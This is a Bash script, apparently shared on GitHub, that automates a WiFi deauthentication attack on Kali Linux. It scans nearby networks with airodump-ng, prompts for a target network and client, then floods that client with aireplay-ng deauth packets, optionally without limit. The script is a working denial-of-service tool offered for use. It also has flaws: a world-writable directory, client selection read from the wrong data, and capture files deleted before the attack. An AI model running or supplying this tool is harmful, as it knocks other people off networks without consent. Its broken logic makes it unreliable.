#!/bin/bash

YELLOW='\033[1;33m'
RED='\033[31m'
GREEN='\033[32m'
NC='\033[0m'

#!/bin/bash
clear
echo -e "\e[31m" 

echo "       .-'      '-."
echo "     .'            '."
echo "    /   O      O     \\"
echo "   :                :"
echo "   |                |"
echo "   : ',          ,' :"
echo "    \\  '-......-'  /"
echo "     '.          .'"
echo "       '-......-'"
echo "        .----."
echo "     _.'      '._"
echo "   .' |  X  X  | '.     <<< WiFi Disconnected"
echo "  /   |   ||   |   \\"
echo "  '.__|___||___|__.'"

echo -e "\e[0m"      
echo
echo -e "\e[34mGitHub:\e[0m https://github.com/SHNN267"    


read -p "$(echo -e "${YELLOW} enter your username on kali is : ${NC}")" username
mkdir -m 777 /home/$username/Desktop/deauth

Directory="/home/$username/Desktop/deauth"
OUTPUT_FILE="${Directory}/deauth"

aireplay-ng --test wlan1

airodump-ng wlan1 -w $OUTPUT_FILE --output-format csv

awk -F',' 'NR > 2 && NF > 14 {print NR-2 ": " "SSID: " $14 ", BSSID: " $1 ", Channel: " $4 ", Signal: " $9}' ${OUTPUT_FILE}-01.csv > ${OUTPUT_FILE}.txt

echo " "
echo " "
echo -e "${GREEN} this is available network${NC}"

cat ${OUTPUT_FILE}.txt | grep -E "SSID|BSSID|Channel" | awk -F", " '{
    split($1, a, ": "); ssid = a[3]; 
    split($2, b, ": "); bssid = b[2]; 
    split($3, c, ": "); channel = c[2]; 
    printf "%d: SSID: %-10s BSSID: %-20s Channel: %s\n", NR, ssid, bssid, channel
}'

read -p "$(echo -e "${RED} enter your target is :${NC}")" network_number

BSSID=$(awk -F',' -v num=$network_number 'NR == num+2 {print $1}' ${OUTPUT_FILE}-01.csv)
CHANNEL=$(awk -F',' -v num=$network_number 'NR == num+2 {print $4}' ${OUTPUT_FILE}-01.csv)

echo " "
echo "Selected Network:"
echo " "
echo "BSSID: $BSSID, Channel: $CHANNEL"

airodump-ng --bssid $BSSID --channel $CHANNEL --write ${OUTPUT_FILE}_handshake wlan1 

awk -F',' 'NR > 2 && NF > 6 {print NR-2 ": " "Client MAC: " $1}' ${OUTPUT_FILE}-01.csv > ${OUTPUT_FILE}_clients.txt

echo "Connected clients:"
echo " "
cat ${OUTPUT_FILE}_clients.txt

read -p "$(echo -e "${YELLOW} enter client number is : ${NC}")" client_number

CLIENT_MAC=$(awk -F',' -v num=$client_number 'NR == num+2 {print $1}' ${OUTPUT_FILE}-01.csv)

echo -e "${GREEN}client MAC is : $CLIENT_MAC${NC}"

read -p "$(echo -e "${YELLOW} enter number packet .. choose 0 to unlimite deauth ${NC}")" packets

rm -r /home/$username/Desktop/deauth/*

command1="airodump-ng --bssid $BSSID --channel $CHANNEL --write ${OUTPUT_FILE}_handshake wlan1 &"

aireplay-ng --deauth $packets -a $BSSID -c $CLIENT_MAC wlan1
